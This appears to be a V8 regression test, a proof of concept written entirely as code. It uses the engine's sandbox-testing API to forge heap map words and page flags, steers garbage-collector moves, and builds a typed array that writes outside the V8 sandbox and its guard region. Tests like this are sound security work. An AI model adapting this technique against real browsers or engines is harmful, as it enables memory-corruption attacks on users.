// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --expose-gc

const kPageSize = 0x40000;
const kPageMask = ~(BigInt(kPageSize) - 1n);
const kFromPage = 1 << 3;  // MemoryChunk::FROM_PAGE

const kTypedArrayType = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kExternalPointerOffset =
    Sandbox.getFieldOffset(kTypedArrayType, 'external_pointer');
const kBasePointerOffset =
    Sandbox.getFieldOffset(kTypedArrayType, 'base_pointer');

const cageView = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getBackingStoreOffset(ab) {
  const ta = new Uint8Array(ab);
  const addr = Sandbox.getAddressOf(ta);
  return cageView.getBigUint64(addr + kExternalPointerOffset, true) >> 24n;
}

function writeU32(addr, val) {
  const addrBi = BigInt(addr);
  const pageOffset = Number(addrBi & 0xfffn);
  const baseOffset = Number(addrBi - BigInt(pageOffset));
  const dv = new DataView(new Sandbox.MemoryView(baseOffset, 0x1000));
  dv.setUint32(pageOffset, val >>> 0, true);
}

function writeU64(addr, val) {
  const addrBi = BigInt(addr);
  const pageOffset = Number(addrBi & 0xfffn);
  const baseOffset = Number(addrBi - BigInt(pageOffset));
  const dv = new DataView(new Sandbox.MemoryView(baseOffset, 0x1000));
  dv.setBigUint64(pageOffset, BigInt(val), true);
}

function readBytes(addr, len) {
  const addrBi = BigInt(addr);
  const pageOffset = Number(addrBi & 0xfffn);
  const baseOffset = Number(addrBi - BigInt(pageOffset));
  const dv = new DataView(new Sandbox.MemoryView(baseOffset, 0x1000));
  const res = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    res[i] = dv.getUint8(pageOffset + i);
  }
  return res;
}

function writeBytes(addr, bytes) {
  const addrBi = BigInt(addr);
  const pageOffset = Number(addrBi & 0xfffn);
  const baseOffset = Number(addrBi - BigInt(pageOffset));
  const dv = new DataView(new Sandbox.MemoryView(baseOffset, 0x1000));
  for (let i = 0; i < bytes.length; i++) {
    dv.setUint8(pageOffset + i, bytes[i]);
  }
}

// Populate mapped RW regions across the first ~300GB of the sandbox:
// 1. Regular ArrayBuffers populate d8's 16GB PAInSandboxAllocator pool.
// 2. Resizable ArrayBuffers reserve 2GB/4GB each in the sandbox page allocator
//    while only committing the first 512KB RW.
const buffers = [];
const waypoints = [];

const templateTa = new Uint8Array(64);

for (let i = 0; i < 8; i++) {
  try {
    const ab = new ArrayBuffer(0x7fe00000);
    buffers.push(ab);
    const base = getBackingStoreOffset(ab);
    const aligned = (base + 0x3ffffn) & kPageMask;
    waypoints.push(aligned + 0x100n);
  } catch (e) {}
}

for (let i = 0; i < 6; i++) {
  try {
    const rab = new ArrayBuffer(0x80000, {maxByteLength: 0x80000000});
    buffers.push(rab);
    const base = getBackingStoreOffset(rab);
    const aligned = (base + 0x3ffffn) & kPageMask;
    waypoints.push(aligned + 0x100n);
    waypoints.push(aligned + 0x3f000n);
  } catch (e) {}
}

for (let i = 0; i < 80; i++) {
  try {
    const rab = new ArrayBuffer(0x80000, {maxByteLength: 0x100000000});
    buffers.push(rab);
    const base = getBackingStoreOffset(rab);
    const aligned = (base + 0x3ffffn) & kPageMask;
    waypoints.push(aligned + 0x100n);
    waypoints.push(aligned + 0x3f000n);
  } catch (e) {}
}

gc();
const templateAddr = Sandbox.getAddressOf(templateTa);
const templateBytes = readBytes(templateAddr, 64);

waypoints.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));

function step(currentAddr, diff, isFirst) {
  if (!isFirst) {
    const chunkAddr = currentAddr & kPageMask;
    writeU32(chunkAddr, kFromPage);
  }
  const diffInChunks = Number(diff / 4n);
  const mapWord = diffInChunks << 1;
  writeU32(currentAddr, mapWord);
}

function main() {
  let ta = [1.1, 2.2, 3.3];
  let cur = BigInt(Sandbox.getAddressOf(ta));
  const kTargetOffset = 73n * 0x100000000n;  // > 288GB guard region
  let isFirst = true;

  while (cur < kTargetOffset) {
    // Pick the furthest reachable waypoint within a positive 31-bit Smi offset
    // (< 4GB).
    let next = -1n;
    for (const wp of waypoints) {
      const diff = wp - cur;
      if (diff > 0n && diff <= 0xfffffc00n && (diff & 3n) === 0n) {
        next = wp;
      }
    }
    if (next === -1n) break;

    const diff = next - cur;
    step(cur, diff, isFirst);
    isFirst = false;
    gc({type: 'minor'});
    cur = next;
  }

  // Copy a valid Uint8Array template to `cur` and set its SandboxedPointer
  // external_pointer to 1TB - 1GB so `GetPtrComprCageBase(ta) + offset`
  // exceeds the 1TB sandbox + 288GB trailing guard region.
  writeBytes(cur, templateBytes);
  writeU32(cur + BigInt(kBasePointerOffset), 0);
  writeU64(cur + BigInt(kExternalPointerOffset), 0xffc0000000000000n);

  ta.fill(0x41);
}

main();
